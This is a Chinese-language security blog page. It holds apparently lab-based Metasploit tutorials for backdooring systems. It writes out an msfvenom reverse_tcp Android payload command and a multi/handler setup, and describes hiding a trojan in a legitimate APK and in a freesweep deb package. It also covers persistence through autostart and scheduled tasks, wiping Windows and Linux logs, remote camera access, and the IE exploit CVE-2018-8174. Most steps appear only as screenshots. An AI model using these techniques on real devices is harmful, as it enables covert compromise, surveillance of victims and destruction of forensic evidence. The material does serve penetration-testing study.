<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163629607.png" alt="image-20210819163629607"></p>
<p>效果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163806587.png" alt="image-20210819163806587"></p>
<p>补充：由于我们远程控制靶机下载了2个恶意文件，很容易暴露</p>
<p>我们可以删除2个文件，其还可以监听到</p>
<p>靶机端删除</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164122924.png" alt="image-20210819164122924"></p>
<p>攻击者端</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164347771.png" alt="image-20210819164347771"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164453141.png" alt="image-20210819164453141"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164501638.png" alt="image-20210819164501638"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819164529645.png" alt="image-20210819164529645"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819201847720.png" alt="image-20210819201847720"></p>
<h2 id="四、使用脚本进行自动创建back-door"><a href="#四、使用脚本进行自动创建back-door" class="headerlink" title="四、使用脚本进行自动创建back door"></a>四、使用脚本进行自动创建back door</h2><p><strong>步骤1：</strong>配置脚本程序：</p>
<p>​    注意要如图所视目录操作；因为后面的下载路径是根据这里来的。（当然也可以该，要是要注意下载路径）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202050680.png" alt="image-20210819202050680"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202616448.png" alt="image-20210819202616448"></p>
<p>步骤2：渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202658813.png" alt="image-20210819202658813"></p>
<p>（监听与上面实战例子的渗透模块一样，所以这里就不写操作了）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202433617.png" alt="image-20210819202433617"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819202832845.png" alt="image-20210819202832845"></p>
<p>靶机执行脚本（这里只是为了展示，应该是有kali里执行比较好）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203051765.png" alt="image-20210819203051765"></p>
<p>kali查看监听结果</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203151702.png" alt="image-20210819203151702"></p>
<p>进入会话后</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203304121.png" alt="image-20210819203304121"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203339202.png" alt="image-20210819203339202"></p>
<p><strong>步骤3：</strong>让脚本自动运行</p>
<p>方法1：配置开机自启动</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203504865.png" alt="image-20210819203504865"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819203920988.png" alt="image-20210819203920988"></p>
<p>方法2：配置系统级别的计划任务</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204117351.png" alt="image-20210819204117351"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204145273.png" alt="image-20210819204145273"></p>
<p>效果说明：靶机系统让脚本每小时启动一次</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204258879.png" alt="image-20210819204258879"></p>
<h2 id="五、清理系统日志"><a href="#五、清理系统日志" class="headerlink" title="五、清理系统日志"></a>五、清理系统日志</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204504875.png" alt="image-20210819204504875"></p>
<h4 id="5-1-window日志清理"><a href="#5-1-window日志清理" class="headerlink" title="5.1 window日志清理"></a><strong>5.1 window日志清理</strong></h4><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204549925.png" alt="image-20210819204549925"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204652982.png" alt="image-20210819204652982"></p>
<p>​        也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204737145.png" alt="image-20210819204737145"></p>
<h4 id="5-2-Linux日志清理"><a href="#5-2-Linux日志清理" class="headerlink" title="5.2 Linux日志清理"></a><strong>5.2 Linux日志清理</strong></h4><p>kali进入其shell里操作</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819204946095.png" alt="image-20210819204946095"></p>
<p>  也可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205049062.png" alt="image-20210819205049062"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205105885.png" alt="image-20210819205105885"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205150600.png" alt="image-20210819205150600"></p>
<p>还可以</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819205205428.png" alt="image-20210819205205428"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">Android客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-18 18:29:35" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 10:36:02" itemprop="dateModified" datetime="2021-10-08T10:36:02+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Android客户端渗透"><a href="#Android客户端渗透" class="headerlink" title="Android客户端渗透"></a>Android客户端渗透</h1><h2 id="一、back-door程序渗透Android"><a href="#一、back-door程序渗透Android" class="headerlink" title="一、back door程序渗透Android"></a>一、back door程序渗透Android</h2><p>步骤1：使用MSF生成一个apk的back door应用程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
<p>步骤2：监听</p>
<p>启动msf</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p>加载渗透模块并配置参数</p>
<p>use exploit/multi/handler</p>
<p>set payload android/meterpreter/reverse_tcp</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤3：</p>
<p>手机端下载并打开程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
<p>kali端，会话建立成功</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
<p>操控命令说明补充：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
<p><strong>步骤1：搭建环境</strong></p>
<p>禁用ipv6</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
<p>下载工具</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
<p>解压文件</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
<p>解压结果</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
<p>修改程序</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
<p><strong>步骤2：</strong>注入back door到apk</p>
<p>载入要注入back door的apk和apktool.jar工具到kali（注意路径）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
<p>进入apk工具（这里用到逆向与注入）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
<p>选择第3项（输入3)，然后配置参数</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
<p>补充：</p>
<p>出错情况1：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
<p>出错情况2：</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
<p>解决方法</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
<p>步骤4：启动apache2服务</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
<p>把apk放到根目录方便下载</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
<p>步骤5：Android手机下载并安装apk</p>
<p>安装过程略，启动运行软件后</p>
<p>直接上结果</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
<p>补充：</p>
<p>启动摄像头</p>
<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
<p>注意：手机端会提示是是否打开摄像头</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">利用deb包-0day-java环境进行渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-18 16:17:01" itemprop="dateCreated datePublished" datetime="2021-08-18T16:17:01+08:00">2021-08-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 11:16:10" itemprop="dateModified" datetime="2021-10-08T11:16:10+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="利用deb包-0day-java环境进行渗透"><a href="#利用deb包-0day-java环境进行渗透" class="headerlink" title="利用deb包-0day-java环境进行渗透"></a>利用deb包-0day-java环境进行渗透</h1><h2 id="一、制作恶意deb软件包来触发back-door"><a href="#一、制作恶意deb软件包来触发back-door" class="headerlink" title="一、制作恶意deb软件包来触发back door"></a>一、制作恶意deb软件包来触发back door</h2><p><strong>以freesweep软件包为例子</strong> </p>
<p>步骤1：下载正版的freesweep软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154438382.png" alt="image-20210817154438382"></p>
<p>步骤2：</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154803409.png" alt="image-20210817154803409"></p>
<p><strong>命令说明</strong>：把EOF重定向（写入）到/root/free/DEBIAN/control里；EOF是指其下一行开始到最后EOF那一行的所有内容</p>
<p><strong>补充</strong>：也可以进入目录用vim写入，如下</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154555203.png" alt="image-20210817154555203"></p>
<p>确保路径存在（目录不存在，则要自己创建），注意大小写、顺序。</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154651297.png" alt="image-20210817154651297"></p>
<p>步骤3：创建deb软件包，安装后脚步文件来加载back door</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155435610.png" alt="image-20210817155435610"></p>
<p>设置文件执行权限</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155637985.png" alt="image-20210817155637985"></p>
<p>重新打包软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155808883.png" alt="image-20210817155808883"></p>
<p>说明：文件夹叫什么名，打包出来的软件包就叫什么名</p>
<p>步骤4：效果演示</p>
<p><strong>监听</strong></p>
<p>环境：一台kali（自己监听自己）</p>
<p>进入msf</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160019739.png" alt="image-20210817160019739"></p>
<p>加载监听模块并配置参数</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160301457.png" alt="image-20210817160301457"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160347828.png" alt="image-20210817160347828"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160457759.png" alt="image-20210817160457759"></p>
<p>打开另外一个控制台安装软件包</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160543619.png" alt="image-20210817160543619"></p>
<p>结果：会话建立成功</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160622947.png" alt="image-20210817160622947"></p>
<p>补充：软件包被卸载后，会话会自动断开</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160756710.png" alt="image-20210817160756710"></p>
<h2 id="二、利用0DAY漏洞CVE-2018-8174获取shell"><a href="#二、利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="二、利用0DAY漏洞CVE-2018-8174获取shell"></a>二、利用0DAY漏洞CVE-2018-8174获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165222216.png" alt="image-20210817165222216"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165327932.png" alt="image-20210817165327932"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165542797.png" alt="image-20210817165542797"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165853688.png" alt="image-20210817165853688"></p>
<p>将恶意文件拷贝到web根目录下，</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170035572.png" alt="image-20210817170035572"></p>
<p>开启apache服务</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170128424.png" alt="image-20210817170128424"></p>
<p>加载和配置模块</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170259965.png" alt="image-20210817170259965"></p>
<p>在window下启动恶意文件，要注意payload设置</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170320356.png" alt="image-20210817170320356"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170330785.png" alt="image-20210817170330785"></p>
<p>启动，监听</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170444127.png" alt="image-20210817170444127"></p>
<p>3.启动恶意文件</p>
<p>注意：该漏洞针对的是ie浏览器和IE内核的浏览器（如360浏览器）</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170646899.png" alt="image-20210817170646899"></p>
<p>结果</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170726851.png" alt="image-20210817170726851"></p>
